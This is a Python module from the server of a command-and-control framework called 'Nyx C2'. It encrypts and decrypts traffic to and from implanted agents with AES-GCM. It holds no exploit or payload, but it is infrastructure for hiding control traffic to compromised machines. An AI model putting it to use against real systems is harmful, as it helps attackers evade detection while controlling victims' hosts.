"""
AES-256-GCM request/response encryption for the Nyx C2 server.

When agents are built with -ldflags "-X main.EncKey=<hex>", they encrypt
all POST bodies. The server decrypts on the way in and encrypts responses
on the way out. Traffic key is set via NYX_ENC_KEY env variable.
"""
import os, binascii
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import json

_KEY_HEX = os.getenv("NYX_ENC_KEY", "")
_gcm: AESGCM | None = None

def init_crypto() -> None:
    global _gcm
    if not _KEY_HEX:
        return
    try:
        key = binascii.unhexlify(_KEY_HEX)
        if len(key) not in (16, 24, 32):
            raise ValueError("Key must be 16/24/32 bytes")
        _gcm = AESGCM(key)
        print(f"[+] AES-{len(key)*8}-GCM traffic encryption active")
    except Exception as e:
        print(f"[!] Crypto init error: {e}")


def decrypt_body(raw: bytes) -> bytes:
    """Decrypt an encrypted agent payload, or return plaintext as-is."""
    if _gcm is None:
        return raw
    try:
        envelope = json.loads(raw)
        if "enc" not in envelope:
            return raw
        ct = binascii.unhexlify(envelope["enc"])
        nonce_size = 12
        nonce, ciphertext = ct[:nonce_size], ct[nonce_size:]
        return _gcm.decrypt(nonce, ciphertext, None)
    except Exception:
        return raw  # fallback: assume plaintext


def encrypt_body(data: bytes) -> bytes:
    """Encrypt a response for the agent."""
    if _gcm is None:
        return data
    import os as _os
    nonce = _os.urandom(12)
    ct = _gcm.encrypt(nonce, data, None)
    envelope = {"enc": binascii.hexlify(nonce + ct).decode()}
    return json.dumps(envelope).encode()
